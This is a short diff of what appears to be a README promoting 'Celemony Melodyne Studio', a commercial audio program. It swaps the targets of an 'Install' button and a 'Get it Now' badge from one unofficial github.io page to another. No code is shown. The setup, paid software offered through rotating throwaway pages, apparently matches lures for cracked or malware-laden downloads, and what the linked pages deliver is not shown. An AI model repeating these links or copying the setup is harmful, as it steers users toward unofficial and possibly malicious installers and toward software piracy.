@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://pasito2-pod.github.io/.github/celemonyMelodyneStudio)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://loksi-wias.github.io/.github/celemonyMelodyneStudio)
 
 </div>
 
@@ -81,7 +81,7 @@ Melodyne's DNA Direct Note Access remains technically unique years after its int
 
 <p align="center">
 
-[![Get it Now Celemony Melodyne Studio](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://pasito2-pod.github.io/.github/celemonyMelodyneStudio)
+[![Get it Now Celemony Melodyne Studio](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://loksi-wias.github.io/.github/celemonyMelodyneStudio)
 
 </p>
 
